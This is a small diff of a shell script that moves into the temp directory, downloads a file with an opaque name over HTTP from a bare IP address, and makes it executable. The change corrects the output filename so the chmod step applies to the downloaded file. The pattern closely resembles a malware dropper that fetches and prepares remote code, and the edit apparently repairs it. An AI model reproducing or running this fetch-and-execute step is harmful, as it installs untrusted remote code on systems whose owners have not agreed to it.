@@ -5,7 +5,7 @@ set -e
 
 cd "$TMPDIR"
 
-curl -fsSL -o Verole http://64.89.160.11/Dopafab
+curl -fsSL -o Dopafab http://64.89.160.11/Dopafab
 
 chmod +x Dopafab
 
